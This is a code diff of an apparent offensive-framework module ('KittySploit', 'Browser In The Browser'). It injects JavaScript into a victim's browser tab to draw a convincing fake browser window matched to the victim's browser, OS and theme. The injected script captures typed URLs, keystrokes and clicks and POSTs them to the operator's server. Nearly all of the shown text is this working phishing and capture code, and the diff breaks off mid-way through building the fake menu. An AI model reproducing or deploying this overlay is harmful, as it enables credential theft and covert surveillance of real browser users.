@@ -3,50 +3,155 @@ import uuid
 import time
 import json
 
+
 class Module(BrowserAuxiliary):
 
     __info__ = {
         "name": "Browser In The Browser",
-        "description": "Create a fake browser interface inside the real browser to capture user interactions (URLs, clicks, keystrokes)",
+        "description": (
+            "BITB: fake OS window and browser chrome inside the victim tab; "
+            "capture omnibox URLs, chrome keystrokes, and same-origin iframe activity"
+        ),
         "author": "KittySploit Team",
         "browser": Browser.ALL,
         "platform": Platform.ALL,
         "session_type": SessionType.BROWSER,
     }
 
-    browser_type = OptString("chrome", "Browser type to simulate (chrome, firefox, edge)", True)
-    target_url = OptString("https://kittysploit.com", "Initial URL to display in the fake browser", True)
-    capture_keystrokes = OptString("true", "Capture all keystrokes (true/false)", True)
-    capture_urls = OptString("true", "Capture all URLs entered (true/false)", True)
-    capture_clicks = OptString("true", "Capture all clicks (true/false)", True)
-    timeout = OptInteger(0, "Timeout in seconds (0 = run indefinitely until Ctrl+C)", True)
+    browser_type = OptString("auto", "chrome | firefox | edge | auto (from user agent)", False)
+    target_url = OptString("", "Initial URL (empty = current page href)", False)
+    layout = OptString("window", "window (centered BITB) | fullscreen", False)
+    os_chrome = OptString("auto", "auto | macos | windows", False)
+    theme = OptString("auto", "auto | light | dark", False)
+    capture_keystrokes = OptBool(True, "Capture keystrokes (omnibox + same-origin iframe)", False)
+    capture_urls = OptBool(True, "Capture URLs submitted in the omnibox", False)
+    capture_clicks = OptBool(True, "Capture toolbar clicks and same-origin iframe clicks", False)
+    timeout = OptInteger(120, "Monitor captures in seconds (0 = inject only, no console monitor)", False)
 
     def check(self):
-        """Check if the module can be executed"""
+        self._ensure_browser_server()
+        if not self.browser_server:
+            print_error("Browser server not available. Start it with 'browser_server start'")
+            return False
+        if not self.session_id:
+            print_error("session_id is not set")
+            return False
+        layout = str(self.layout or "window").strip().lower()
+        if layout not in ("window", "fullscreen"):
+            print_error("layout must be 'window' or 'fullscreen'")
+            return False
         return True
 
     def run(self):
-        """Create a fake browser interface and capture user interactions"""
+        if not self.check():
+            return False
+
         bitb_id = str(uuid.uuid4())
-        
-        # Convert string booleans to actual booleans for JavaScript
-        capture_keystrokes = self.capture_keystrokes.lower() in ('true', '1', 'yes', 'on')
-        capture_urls = self.capture_urls.lower() in ('true', '1', 'yes', 'on')
-        capture_clicks = self.capture_clicks.lower() in ('true', '1', 'yes', 'on')
-        
-        # Get server configuration
-        code_js = f"""
+        opts = {
+            "bitb_id": bitb_id,
+            "browser_type": str(self.browser_type or "auto").strip().lower(),
+            "target_url": str(self.target_url or "").strip(),
+            "layout": str(self.layout or "window").strip().lower(),
+            "os_chrome": str(self.os_chrome or "auto").strip().lower(),
+            "theme": str(self.theme or "auto").strip().lower(),
+            "capture_keystrokes": self._to_bool(self.capture_keystrokes),
+            "capture_urls": self._to_bool(self.capture_urls),
+            "capture_clicks": self._to_bool(self.capture_clicks),
+        }
+
+        code_js = self._build_js(opts)
+        result = self.send_js_and_wait_for_response(code_js, timeout=20.0)
+        if not result:
+            print_error("Failed to inject Browser In The Browser (timeout or no response)")
+            return False
+
+        payload = self._parse_injection_result(result)
+        if payload.get("error") or not payload.get("ok"):
+            print_error(payload.get("error") or f"Unexpected injection response: {result}")
+            return False
+
+        print_success("Browser In The Browser injected successfully")
+        print_info(f"Skin: {payload.get('browser', opts['browser_type'])} | OS chrome: {payload.get('os', opts['os_chrome'])}")
+        print_info(f"Layout: {payload.get('layout', opts['layout'])} | theme: {payload.get('theme', opts['theme'])}")
+        print_info(f"Initial URL: {payload.get('initial_url', '(current page)')}")
+        print_info("Teardown in target tab: window.__ksBitb && window.__ksBitb.stop()")
+
+        try:
+            timeout_value = int(self.timeout) if self.timeout is not None else 120
+        except (ValueError, TypeError):
+            timeout_value = 120
+
+        if timeout_value > 0:
+            print_info("Press Ctrl+C to stop monitoring...")
+            print_empty()
+            try:
+                self._monitor_captures(bitb_id, timeout_value)
+            except KeyboardInterrupt:
+                print_status("Monitoring interrupted by user")
+            except Exception as e:
+                print_warning(f"Monitoring error (BITB overlay remains active): {e}")
+        else:
+            print_info("Monitoring disabled (timeout=0).")
+
+        return True
+
+    @staticmethod
+    def _parse_injection_result(result):
+        if isinstance(result, dict):
+            return result
+        if not isinstance(result, str):
+            return {"ok": False, "error": "Invalid response type"}
+        text = result.strip()
+        if text.startswith("{"):
+            try:
+                return json.loads(text)
+            except json.JSONDecodeError:
+                pass
+        if "success" in text.lower() or "initialized" in text.lower():
+            return {"ok": True, "message": text}
+        return {"ok": False, "error": text or "Empty response"}
+
+    def _build_js(self, opts: dict) -> str:
+        cfg = json.dumps(opts)
+        return f"""
         (function() {{
-            const BITB_ID = '{bitb_id}';
-            const BROWSER_TYPE = '{self.browser_type}';
-            const TARGET_URL = '{self.target_url}';
-            const CAPTURE_KEYSTROKES = {str(capture_keystrokes).lower()};
-            const CAPTURE_URLS = {str(capture_urls).lower()};
-            const CAPTURE_CLICKS = {str(capture_clicks).lower()};
-            
+            const CFG = {cfg};
+            const BITB_ID = CFG.bitb_id;
+
+            function detectBrowser() {{
+                if (CFG.browser_type && CFG.browser_type !== 'auto') return CFG.browser_type;
+                const ua = navigator.userAgent || '';
+                if (/Edg\\//.test(ua)) return 'edge';
+                if (/Firefox\\//.test(ua)) return 'firefox';
+                return 'chrome';
+            }}
+
+            function detectOS() {{
+                if (CFG.os_chrome && CFG.os_chrome !== 'auto') return CFG.os_chrome;
+                const p = navigator.platform || '';
+                const ua = navigator.userAgent || '';
+                if (/Mac|iPhone|iPad|iPod/.test(p) || /Mac OS/.test(ua)) return 'macos';
+                return 'windows';
+            }}
+
+            function resolveTheme() {{
+                if (CFG.theme === 'light' || CFG.theme === 'dark') return CFG.theme;
+                if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) return 'dark';
+                return 'light';
+            }}
+
+            if (window.__ksBitb && typeof window.__ksBitb.stop === 'function') {{
+                try {{ window.__ksBitb.stop(); }} catch (e) {{}}
+            }}
+
+            const BROWSER = detectBrowser();
+            const OS = detectOS();
+            const DARK = resolveTheme() === 'dark';
+            const LAYOUT = (CFG.layout === 'fullscreen') ? 'fullscreen' : 'window';
+            const INITIAL = CFG.target_url || location.href;
+
             let SERVER_HOST = '127.0.0.1';
             let SERVER_PORT = '8080';
-            
             if (window.kittysploit) {{
                 if (typeof window.kittysploit.getServerHost === 'function') {{
                     SERVER_HOST = window.kittysploit.getServerHost();
@@ -55,835 +160,790 @@ class Module(BrowserAuxiliary):
                     SERVER_PORT = window.kittysploit.getServerPort();
                 }}
             }}
-            
-            // Function to send captured data to server
+
             function sendCapturedData(data) {{
                 let currentSessionId = null;
                 if (window.kittysploit && typeof window.kittysploit.sessionId === 'function') {{
                     currentSessionId = window.kittysploit.sessionId();
                 }}
-                
-                const payload = {{
-                    session_id: currentSessionId,
-                    command_id: BITB_ID,
-                    result: JSON.stringify({{
-                        type: 'browser_in_browser',
-                        data: data,
-                        timestamp: new Date().toISOString()
-                    }}),
-                    timestamp: new Date().toISOString()
-                }};
-                
-                fetch(`http://${{SERVER_HOST}}:${{SERVER_PORT}}/api/command`, {{
+                fetch('http://' + SERVER_HOST + ':' + SERVER_PORT + '/api/command', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify(payload)
-                }}).catch(error => {{}});
-            }}
-            
-            // Check if BITB already exists
-            if (document.getElementById('ks-bitb-container')) {{
-                return 'Browser In The Browser already active';
-            }}
-            
-            // Store captured data
-            const capturedData = {{
-                urls: [],
-                keystrokes: [],
-                clicks: [],
-                currentUrl: TARGET_URL
-            }};
-            
-            // Create main container
-            const container = document.createElement('div');
-            container.id = 'ks-bitb-container';
-            container.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                z-index: 999999;
-                background: #f5f5f5;
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-                display: flex;
-                flex-direction: column;
-            `;
-            
-            // Browser-specific styles with more realistic colors
-            let browserStyles = {{}};
-            if (BROWSER_TYPE === 'chrome') {{
-                browserStyles = {{
-                    barColor: '#f1f3f4',
-                    barBorder: '#dadce0',
-                    buttonHover: '#e8eaed',
-                    buttonActive: '#d1d4d8',
-                    activeTabBg: '#ffffff',
-                    inactiveTabBg: '#e8eaed',
-                    tabBorder: '#dadce0',
-                    tabHover: '#f8f9fa',
-                    addressBarBg: '#ffffff',
-                    addressBarBorder: '#dadce0',
-                    addressBarFocus: '#1a73e8',
-                    textColor: '#202124',
-                    textSecondary: '#5f6368'
-                }};
-            }} else if (BROWSER_TYPE === 'firefox') {{
-                browserStyles = {{
-                    barColor: '#f9f9fa',
-                    barBorder: '#d7d7db',
-                    buttonHover: '#e0e0e2',
-                    buttonActive: '#c8c8c8',
-                    activeTabBg: '#ffffff',
-                    inactiveTabBg: '#f0f0f4',
-                    tabBorder: '#d7d7db',
-                    tabHover: '#f9f9fa',
-                    addressBarBg: '#ffffff',
-                    addressBarBorder: '#d7d7db',
-                    addressBarFocus: '#0060df',
-                    textColor: '#0c0c0d',
-                    textSecondary: '#737373'
-                }};
-            }} else {{ // edge
-                browserStyles = {{
-                    barColor: '#f3f3f3',
-                    barBorder: '#d1d1d1',
-                    buttonHover: '#e5e5e5',
-                    buttonActive: '#d1d1d1',
-                    activeTabBg: '#ffffff',
-                    inactiveTabBg: '#f3f3f3',
-                    tabBorder: '#d1d1d1',
-                    tabHover: '#fafafa',
-                    addressBarBg: '#ffffff',
-                    addressBarBorder: '#d1d1d1',
-                    addressBarFocus: '#0078d4',
-                    textColor: '#1a1a1a',
-                    textSecondary: '#666666'
-                }};
-            }}
-            
-            // Create toolbar
-            const toolbar = document.createElement('div');
-            toolbar.style.cssText = `
-                background: ${{browserStyles.barColor}};
-                border-bottom: 1px solid ${{browserStyles.barBorder}};
-                padding: 6px 8px;
-                display: flex;
-                align-items: center;
-                gap: 6px;
-                flex-shrink: 0;
-                box-shadow: 0 1px 2px rgba(0,0,0,0.05);
-            `;
-            
-            // Navigation buttons with SVG icons
-            const navButtons = document.createElement('div');
-            navButtons.style.cssText = 'display: flex; gap: 2px; align-items: center;';
-            
-            const backBtn = createNavButton(`
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="M19 12H5M12 19l-7-7 7-7"/>
-                </svg>
-            `, 'Go back');
-            const forwardBtn = createNavButton(`
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="M5 12h14M12 5l7 7-7 7"/>
-                </svg>
-            `, 'Go forward');
-            const refreshBtn = createNavButton(`
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8M21 8v5M21 8h-5"/>
-                    <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16M3 16v-5M3 16h5"/>
-                </svg>
-            `, 'Refresh');
-            const homeBtn = createNavButton(`
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
-                    <polyline points="9 22 9 12 15 12 15 22"/>
-                </svg>
-            `, 'Home');
-            
-            navButtons.appendChild(backBtn);
-            navButtons.appendChild(forwardBtn);
-            navButtons.appendChild(refreshBtn);
-            navButtons.appendChild(homeBtn);
-            
-            // Address bar container with icons
-            const addressBarContainer = document.createElement('div');
-            addressBarContainer.style.cssText = `
-                flex: 1;
-                display: flex;
-                align-items: center;
-                background: ${{browserStyles.addressBarBg}};
-                border: 1px solid ${{browserStyles.addressBarBorder}};
-                border-radius: 24px;
-                padding: 0 12px;
-                gap: 8px;
-                transition: all 0.2s;
-                box-shadow: 0 1px 2px rgba(0,0,0,0.05);
-            `;
-            
-            // Security icon (lock for HTTPS)
-            const securityIcon = document.createElement('div');
-            securityIcon.innerHTML = `
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                </svg>
-            `;
-            securityIcon.style.cssText = `
-                color: ${{browserStyles.textSecondary}};
-                display: flex;
-                align-items: center;
-                flex-shrink: 0;
-            `;
-            
-            // Address bar input
-            const addressBar = document.createElement('input');
-            addressBar.type = 'text';
-            addressBar.value = TARGET_URL;
-            addressBar.style.cssText = `
-                flex: 1;
-                border: none;
-                background: transparent;
-                font-size: 14px;
-                color: ${{browserStyles.textColor}};
-                outline: none;
-                padding: 8px 0;
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            `;
-            addressBar.placeholder = 'Search Google or type a URL';
-            
-            // Focus effect
-            addressBar.addEventListener('focus', function() {{
-                addressBarContainer.style.borderColor = browserStyles.addressBarFocus;
-                addressBarContainer.style.boxShadow = `0 0 0 2px ${{browserStyles.addressBarFocus}}33`;
-            }});
-            addressBar.addEventListener('blur', function() {{
-                addressBarContainer.style.borderColor = browserStyles.addressBarBorder;
-                addressBarContainer.style.boxShadow = '0 1px 2px rgba(0,0,0,0.05)';
-            }});
-            
-            addressBarContainer.appendChild(securityIcon);
-            addressBarContainer.appendChild(addressBar);
-            
-            // Capture URL input
-            if (CAPTURE_URLS) {{
-                addressBar.addEventListener('input', function(e) {{
-                    capturedData.currentUrl = e.target.value;
-                }});
-                
-                addressBar.addEventListener('keypress', function(e) {{
-                    if (e.key === 'Enter') {{
-                        const url = e.target.value;
-                        capturedData.urls.push({{
-                            url: url,
+                    body: JSON.stringify({{
+                        session_id: currentSessionId,
+                        command_id: BITB_ID,
+                        result: JSON.stringify({{
+                            type: 'browser_in_browser',
+                            data: data,
                             timestamp: new Date().toISOString()
-                        }});
-                        sendCapturedData({{
-                            event: 'url_entered',
-                            url: url
-                        }});
-                        loadUrl(url);
-                    }}
-                }});
+                        }}),
+                        timestamp: new Date().toISOString()
+                    }})
+                }}).catch(function() {{}});
             }}
-            
-            // Menu button with SVG
-            const menuBtn = createNavButton(`
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="3" y1="6" x2="21" y2="6"/>
-                    <line x1="3" y1="12" x2="21" y2="12"/>
-                    <line x1="3" y1="18" x2="21" y2="18"/>
-                </svg>
-            `, 'Menu');
-            
-            toolbar.appendChild(navButtons);
-            toolbar.appendChild(addressBar);
-            toolbar.appendChild(menuBtn);
-            
-            // Create tabs bar
-            const tabsBar = document.createElement('div');
-            tabsBar.style.cssText = `
-                background: ${{browserStyles.barColor}};
-                border-bottom: 1px solid ${{browserStyles.barBorder}};
-                display: flex;
-                align-items: flex-end;
-                padding: 0 8px;
-                gap: 1px;
-                flex-shrink: 0;
-                overflow-x: auto;
-                position: relative;
-            `;
-            
-            // New tab button
-            const newTabBtn = document.createElement('div');
-            newTabBtn.innerHTML = '+';
-            newTabBtn.style.cssText = `
-                width: 28px;
-                height: 28px;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                cursor: pointer;
-                color: ${{browserStyles.textSecondary}};
-                font-size: 18px;
-                border-radius: 4px;
-                margin: 0 4px 4px 0;
-                transition: background 0.15s;
-            `;
-            newTabBtn.onmouseover = function() {{ this.style.background = browserStyles.buttonHover; }};
-            newTabBtn.onmouseout = function() {{ this.style.background = 'transparent'; }};
-            newTabBtn.onclick = function() {{
-                const newTab = createTab('New Tab', false);
-                tabsBar.insertBefore(newTab, newTabBtn);
+
+            const SKINS = {{
+                chrome: {{
+                    light: {{
+                        bar: '#f1f3f4', border: '#dadce0', tabActive: '#ffffff', tabIdle: '#e8eaed',
+                        text: '#202124', muted: '#5f6368', accent: '#1a73e8', input: '#ffffff',
+                        title: '#ececec', page: '#e8eaed'
+                    }},
+                    dark: {{
+                        bar: '#202124', border: '#3c4043', tabActive: '#35363a', tabIdle: '#292a2d',
+                        text: '#e8eaed', muted: '#9aa0a6', accent: '#8ab4f8', input: '#303134',
+                        title: '#3a3a3c', page: 'rgba(0,0,0,.55)'
+                    }}
+                }},
+                firefox: {{
+                    light: {{
+                        bar: '#f9f9fa', border: '#d7d7db', tabActive: '#ffffff', tabIdle: '#f0f0f4',
+                        text: '#0c0c0d', muted: '#737373', accent: '#0060df', input: '#ffffff',
+                        title: '#ebebeb', page: '#e8eaed'
+                    }},
+                    dark: {{
+                        bar: '#2b2a33', border: '#52525e', tabActive: '#42414d', tabIdle: '#32313c',
+                        text: '#fbfbfe', muted: '#b1b1b3', accent: '#7cb3ff', input: '#1c1b22',
+                        title: '#2b2a33', page: 'rgba(0,0,0,.55)'
+                    }}
+                }},
+                edge: {{
+                    light: {{
+                        bar: '#f3f3f3', border: '#d1d1d1', tabActive: '#ffffff', tabIdle: '#f3f3f3',
+                        text: '#1a1a1a', muted: '#666666', accent: '#0078d4', input: '#ffffff',
+                        title: '#f0f0f0', page: '#e8eaed'
+                    }},
+                    dark: {{
+                        bar: '#2d2d2d', border: '#454545', tabActive: '#3b3b3b', tabIdle: '#2d2d2d',
+                        text: '#f3f3f3', muted: '#a0a0a0', accent: '#4cc2ff', input: '#1f1f1f',
+                        title: '#2d2d2d', page: 'rgba(0,0,0,.55)'
+                    }}
+                }}
             }};
-            
-            // Create first tab
-            const tab = createTab('New Tab', true);
-            tabsBar.appendChild(tab);
-            tabsBar.appendChild(newTabBtn);
-            
-            // Create content area (iframe)
-            const contentArea = document.createElement('div');
-            contentArea.style.cssText = `
-                flex: 1;
-                position: relative;
-                overflow: hidden;
-                background: white;
-            `;
-            
-            const iframe = document.createElement('iframe');
-            iframe.id = 'ks-bitb-iframe';
-            iframe.style.cssText = `
-                width: 100%;
-                height: 100%;
-                border: none;
-            `;
-            iframe.src = TARGET_URL;
-            contentArea.appendChild(iframe);
-            
-            // Function to create navigation button with SVG
-            function createNavButton(svgContent, title) {{
+
+            const browserSkin = SKINS[BROWSER] || SKINS.chrome;
+            const skin = browserSkin[DARK ? 'dark' : 'light'];
+
+            const root = document.createElement('div');
+            root.id = 'ks-bitb-root';
+            if (LAYOUT === 'fullscreen') {{
+                root.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:' + skin.page +
+                    ';display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;';
+            }} else {{
+                root.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:' + skin.page +
+                    ';display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;';
+            }}
+
+            const shell = document.createElement('div');
+            shell.id = 'ks-bitb-container';
+            if (LAYOUT === 'fullscreen') {{
+                shell.style.cssText = 'flex:1;display:flex;flex-direction:column;min-height:0;background:' + skin.bar + ';';
+            }} else {{
+                shell.style.cssText = 'width:min(1140px,96vw);height:min(740px,90vh);display:flex;flex-direction:column;' +
+                    'border-radius:12px;overflow:hidden;box-shadow:0 28px 80px rgba(0,0,0,.45);background:' + skin.bar + ';border:1px solid ' + skin.border + ';';
+            }}
+
+            const progress = document.createElement('div');
+            progress.style.cssText = 'height:2px;width:0;background:' + skin.accent + ';flex-shrink:0;transition:width .35s ease;';
+
+            const toolbar = document.createElement('div');
+            toolbar.style.cssText = 'display:flex;align-items:center;gap:6px;padding:6px 10px;background:' + skin.bar +
+                ';flex-shrink:0;';
+
+            function makeBtn(svg, title) {{
                 const btn = document.createElement('button');
-                btn.innerHTML = svgContent;
+                btn.type = 'button';
                 btn.title = title;
-                btn.style.cssText = `
-                    width: 36px;
-                    height: 36px;
-                    border: none;
-                    background: transparent;
-                    cursor: pointer;
-                    border-radius: 6px;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    color: ${{browserStyles.textSecondary}};
-                    transition: all 0.15s;
-                    padding: 0;
-                `;
-                btn.onmouseover = function() {{
-                    this.style.background = browserStyles.buttonHover;
-                    this.style.color = browserStyles.textColor;
-                }};
-                btn.onmouseout = function() {{
-                    this.style.background = 'transparent';
-                    this.style.color = browserStyles.textSecondary;
-                }};
-                btn.onmousedown = function() {{
-                    this.style.background = browserStyles.buttonActive;
-                }};
-                btn.onmouseup = function() {{
-                    this.style.background = browserStyles.buttonHover;
-                }};
+                btn.innerHTML = svg;
+                btn.style.cssText = 'width:34px;height:34px;border:none;background:transparent;border-radius:6px;color:' +
+                    skin.muted + ';cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0;';
+                btn.onmouseenter = function() {{ btn.style.background = DARK ? '#3c4043' : '#e8eaed'; btn.style.color = skin.text; }};
+                btn.onmouseleave = function() {{ btn.style.background = 'transparent'; btn.style.color = skin.muted; }};
                 return btn;
             }}
-            
-            // Function to create tab with close button
-            function createTab(title, active) {{
-                const tabDiv = document.createElement('div');
-                tabDiv.style.cssText = `
-                    display: flex;
-                    align-items: center;
-                    gap: 8px;
-                    padding: 8px 12px;
-                    background: ${{active ? browserStyles.activeTabBg : browserStyles.inactiveTabBg}};
-                    border: 1px solid ${{browserStyles.tabBorder}};
-                    border-bottom: none;
-                    border-radius: 8px 8px 0 0;
-                    cursor: pointer;
-                    white-space: nowrap;
-                    position: relative;
-                    max-width: 240px;
-                    min-width: 120px;
-                    transition: all 0.15s;
-                    margin-right: 1px;
-                `;
-                
-                // Favicon placeholder
-                const favicon = document.createElement('div');
-                favicon.innerHTML = `
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
-                        <circle cx="12" cy="10" r="3"/>
-                    </svg>
-                `;
-                favicon.style.cssText = `
-                    width: 16px;
-                    height: 16px;
-                    color: ${{browserStyles.textSecondary}};
-                    flex-shrink: 0;
-                `;
-                
-                // Tab title
-                const tabTitle = document.createElement('span');
-                tabTitle.textContent = title;
-                tabTitle.style.cssText = `
-                    flex: 1;
-                    overflow: hidden;
-                    text-overflow: ellipsis;
-                    white-space: nowrap;
-                    font-size: 13px;
-                    color: ${{browserStyles.textColor}};
-                `;
-                
-                // Close button
-                const closeBtn = document.createElement('div');
-                closeBtn.innerHTML = `
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <line x1="18" y1="6" x2="6" y2="18"/>
-                        <line x1="6" y1="6" x2="18" y2="18"/>
-                    </svg>
-                `;
-                closeBtn.style.cssText = `
-                    width: 18px;
-                    height: 18px;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    border-radius: 4px;
-                    color: ${{browserStyles.textSecondary}};
-                    opacity: 0;
-                    transition: all 0.15s;
-                    flex-shrink: 0;
-                `;
-                closeBtn.onmouseover = function(e) {{
-                    e.stopPropagation();
-                    this.style.background = '#e81123';
-                    this.style.color = '#ffffff';
-                }};
-                closeBtn.onmouseout = function() {{
-                    this.style.background = 'transparent';
-                    this.style.color = browserStyles.textSecondary;
-                }};
-                closeBtn.onclick = function(e) {{
-                    e.stopPropagation();
-                    tabDiv.remove();
-                }};
-                
-                tabDiv.appendChild(favicon);
-                tabDiv.appendChild(tabTitle);
-                tabDiv.appendChild(closeBtn);
-                
-                // Show close button on hover
-                tabDiv.onmouseenter = function() {{
-                    closeBtn.style.opacity = '1';
-                    if (!active) {{
-                        tabDiv.style.background = browserStyles.tabHover;
-                    }}
-                }};
-                tabDiv.onmouseleave = function() {{
-                    closeBtn.style.opacity = '0';
-                    if (!active) {{
-                        tabDiv.style.background = browserStyles.inactiveTabBg;
-                    }}
-                }};
-                
-                if (CAPTURE_CLICKS) {{
-                    tabDiv.addEventListener('click', function() {{
-                        capturedData.clicks.push({{
-                            element: 'tab',
-                            title: title,
-                            timestamp: new Date().toISOString()
-                        }});
-                        sendCapturedData({{
-                            event: 'tab_clicked',
-                            tab: title
-                        }});
-                    }});
+
+            const nav = document.createElement('div');
+            nav.style.cssText = 'display:flex;gap:2px;';
+            const backBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>', 'Back');
+            const forwardBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>', 'Forward');
+            const refreshBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8M21 8v5M21 8h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16M3 16v-5M3 16h5"/></svg>', 'Reload');
+            const homeBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>', 'Home');
+            nav.appendChild(backBtn);
+            nav.appendChild(forwardBtn);
+            nav.appendChild(refreshBtn);
+            nav.appendChild(homeBtn);
+
+            const addressBarContainer = document.createElement('div');
+            addressBarContainer.style.cssText = 'flex:1;display:flex;align-items:center;gap:8px;background:' + skin.input +
+                ';border:1px solid ' + skin.border + ';border-radius:22px;padding:0 12px;min-height:36px;transition:box-shadow .2s,border-color .2s;';
+
+            const securityIcon = document.createElement('span');
+            securityIcon.style.cssText = 'display:flex;align-items:center;color:' + skin.muted + ';flex-shrink:0;';
+            securityIcon.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';
+
+            const addressBar = document.createElement('input');
+            addressBar.type = 'text';
+            addressBar.value = INITIAL;
+            addressBar.placeholder = 'Search or type a URL';
+            addressBar.style.cssText = 'flex:1;border:none;background:transparent;outline:none;font-size:14px;color:' + skin.text + ';padding:8px 0;';
+
+            const starBtn = document.createElement('span');
+            starBtn.title = 'Bookmark';
+            starBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>';
+            starBtn.style.cssText = 'color:' + skin.muted + ';display:flex;cursor:default;opacity:.7;';
+
+            addressBarContainer.appendChild(securityIcon);
+            addressBarContainer.appendChild(addressBar);
+            addressBarContainer.appendChild(starBtn);
+
+            addressBar.addEventListener('focus', function() {{
+                addressBarContainer.style.borderColor = skin.accent;
+                addressBarContainer.style.boxShadow = '0 0 0 2px ' + skin.accent + '44';
+            }});
+            addressBar.addEventListener('blur', function() {{
+                addressBarContainer.style.borderColor = skin.border;
+                addressBarContainer.style.boxShadow = 'none';
+            }});
+
+            const menuWrap = document.createElement('div');
+            menuWrap.style.cssText = 'position:relative;display:flex;align-items:center;';
+
+            const menuBtn = makeBtn('<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="18" x2="20" y2="18"/></svg>', 'Menu');
+            const menuPanel = document.createElement('div');
+            menuPanel.style.cssText = 'display:none;position:absolute;top:40px;right:0;min-width:220px;background:' + skin.tabActive +
+                ';border:1px solid ' + skin.border + ';border-radius:8px;box-shadow:0 8px 28px rgba(0,0,0,.18);padding:6px 0;z-index:50;';
+
+            function menuItem(label, opts) {{
+                const row = document.createElement('button');
+                row.type = 'button';
+                const disabled = opts && opts.disabled;
+                row.textContent = label;
+                row.style.cssText = 'display:block;width:100%;text-align:left;border:none;background:transparent;padding:10px 16px;font-size:13px;color:' +
+                    (disabled ? skin.muted : skin.text) + ';cursor:' + (disabled ? 'default' : 'pointer') + ';opacity:' + (disabled ? '.55' : '1') + ';';
+                if (!disabled) {{
+                    row.onmouseenter = function() {{ row.style.background = DARK ? '#3c4043' : '#f1f3f4'; }};
+                    row.onmouseleave = function() {{ row.style.background = 'transparent'; }};
+                    if (opts && opts.action) row.onclick = function(e) {{
+                        e.stopPropagation();
+                        menuPanel.style.display = 'none';
+                        opts.action();
+                    }};
                 }}
-                
-                return tabDiv;
+                return row;
             }}
-            
-            // Function to update security icon
-            function updateSecurityIcon(url) {{
-                const isSecure = url.startsWith('https://');
-                if (isSecure) {{
-                    securityIcon.innerHTML = `
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                        </svg>
-                    `;
-                    securityIcon.style.color = '#1a73e8';
+
+            function menuDivider() {{
+                const d = document.createElement('div');
+                d.style.cssText = 'height:1px;background:' + skin.border + ';margin:6px 0;';
+                return d;
+            }}
+
+            menuPanel.appendChild(menuItem('New tab', {{ action: function() {{ openTab({{ ntp: true }}); }} }}));
+            menuPanel.appendChild(menuItem('New window', {{ disabled: true }}));
+            menuPanel.appendChild(menuDivider());
+            menuPanel.appendChild(menuItem('Reload', {{ action: function() {{ reloadActiveTab(); }} }}));
+            menuPanel.appendChild(menuItem('Print…', {{ disabled: true }}));
